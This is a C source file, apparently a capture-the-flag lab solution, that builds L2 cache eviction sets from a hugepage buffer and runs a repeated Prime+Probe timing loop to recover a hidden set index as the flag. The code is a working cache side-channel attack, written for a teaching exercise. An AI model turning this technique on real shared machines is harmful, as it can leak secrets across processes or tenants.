#include "util.h"
// mman library to be used for hugepage allocations (e.g. mmap or posix_memalign only)
#include <sys/mman.h>

#define BUFF_SIZE (1<<22)
#define CACHELINE_SIZE 64
#define L2_CACHE_SIZE 1048576
#define L2_ASSOCIATIVITY 16
#define L2_NUM_SETS (L2_CACHE_SIZE / (CACHELINE_SIZE * L2_ASSOCIATIVITY))
#define LATENCY_THRES 130
// FILE *fp = NULL;

uint64_t get_l2_cache_index(ADDR_PTR addr)
{
    uint64_t mask = ((uint64_t) 1 << 10) - 1;
    return ((uint64_t) addr >> 6) & mask;
}

void prime_L2_set(uintptr_t **eviction_set, CYCLES **L2_latency){
    volatile int temp;
    for (int i = 0; i < L2_NUM_SETS; i++) {
        for(int j = 0; j < L2_ASSOCIATIVITY; j++){
            // clflush(eviction_set[i][j]);
            temp = *(volatile int *)eviction_set[i][j];
            L2_latency[i][j] = measure_one_block_access_time(eviction_set[i][j]);
        }
    }

}

void probe_L2_set(uintptr_t **eviction_set, CYCLES **L2_latency){
    for (int i = L2_NUM_SETS - 1; i >= 0; i--) {
        for(int j = L2_ASSOCIATIVITY - 1; j >= 0; j--){
            L2_latency[i][j] = measure_one_block_access_time(eviction_set[i][j]);
        }
    }
}

int get_flag(CYCLES **L2_latency_prime, CYCLES **L2_latency_probe){
    int idx = -1;
    uint32_t max = 0;
    for(int i = 0; i < L2_NUM_SETS; i++){
        uint32_t abs_sum = 0;
        for(int j = 0; j < L2_ASSOCIATIVITY; j++){
            abs_sum += abs(L2_latency_probe[i][j] - L2_latency_prime[i][j]);
        }
        if(abs_sum > max) {
            max = abs_sum;
            idx = i;
        }
    }
    // fprintf(fp, "max: %d\n", max)
    return idx;
    // if(max > 1000) return idx;
    // else return -1;
}

// void print_debug(CYCLES **L2_latency_prime, CYCLES **L2_latency_probe){
//     for(int i = 0; i < L2_NUM_SETS; i++){
//         int32_t abs_sum = 0;
//         for(int j = 0; j < L2_ASSOCIATIVITY; j++){
//             abs_sum += (L2_latency_probe[i][j] - L2_latency_prime[i][j]);
//             fprintf(fp, "index: %d  \tbefore: %d \tafter: %d\n", i, L2_latency_prime[i][j], L2_latency_probe[i][j]);
//         }
//         fprintf(fp, "abs: %d\n", abs_sum);
//     }
// }

int main(int argc, char const *argv[]) {
    int flag = -1;
    uintptr_t **eviction_set;
    // Put your capture-the-flag code here

    CYCLES** L2_latency_prime = (CYCLES **)malloc(L2_NUM_SETS * sizeof(uint64_t*)); 
    for(uint64_t i = 0; i < L2_NUM_SETS; i++){
        L2_latency_prime[i] = (CYCLES *)malloc(L2_ASSOCIATIVITY * sizeof(CYCLES));
    }

    CYCLES** L2_latency_prob = (CYCLES **)malloc(L2_NUM_SETS * sizeof(uint64_t*)); 
    for(uint64_t i = 0; i < L2_NUM_SETS; i++){
        L2_latency_prob[i] = (CYCLES *)malloc(L2_ASSOCIATIVITY * sizeof(CYCLES));
    }
    // fp = fopen("test.txt", "w+");

    void *map_buff = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    if(map_buff == (void *) -1){
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    eviction_set = (uintptr_t **)malloc(sizeof(uintptr_t *) * L2_NUM_SETS);
    for(uint64_t i = 0; i < L2_NUM_SETS; i++){
        eviction_set[i] = (uintptr_t *)malloc(sizeof(uintptr_t) * L2_ASSOCIATIVITY);
    }

    int j[L2_NUM_SETS] = {0};
    for (uintptr_t addr = (uintptr_t)map_buff; addr < (uintptr_t)map_buff + BUFF_SIZE; addr += CACHELINE_SIZE) {
        int idx = -1;
        idx = get_l2_cache_index(addr); 
        if(j[idx] < L2_ASSOCIATIVITY) eviction_set[idx][j[idx]++] = addr;
        else continue;
    }


    int count = 10000;
    int best_flag[1024] = {0};
    prime_L2_set(eviction_set, L2_latency_prime);
    prime_L2_set(eviction_set, L2_latency_prime);
    prime_L2_set(eviction_set, L2_latency_prime);
    prime_L2_set(eviction_set, L2_latency_prime);

    while (count--)
    {
        // probe_L2_set(eviction_set, L2_latency_prime);

        // if(count == 4){
        // for(int i = 0; i < 4; i++){
        //     temp = *(volatile int *)test_eviction_set[i];
        // }
        // }
        probe_L2_set(eviction_set, L2_latency_prob);
        probe_L2_set(eviction_set, L2_latency_prob);
        probe_L2_set(eviction_set, L2_latency_prob);
        probe_L2_set(eviction_set, L2_latency_prob);

        // print_debug(L2_latency_prime, L2_latency_prob);

        best_flag[get_flag(L2_latency_prime, L2_latency_prob)]++;
        prime_L2_set(eviction_set, L2_latency_prime);
        prime_L2_set(eviction_set, L2_latency_prime);
        prime_L2_set(eviction_set, L2_latency_prime);
        prime_L2_set(eviction_set, L2_latency_prime);


        // if(flag == -1) prime_L2_set(eviction_set, L2_latency_prime);
    }
    int tmp = 0;
    for(int i = 0; i < L2_NUM_SETS; i++){
        // printf("i: %d, num: %d\n", i, best_flag[i]);
        if(best_flag[i] > tmp){
            tmp = best_flag[i];
            flag = i;
        }
    }

    printf("Flag: %d\n", flag);


    for(int i = 0; i < L2_NUM_SETS; i++) {
        free(eviction_set[i]);
    }
    free(eviction_set);

    return 0;
}
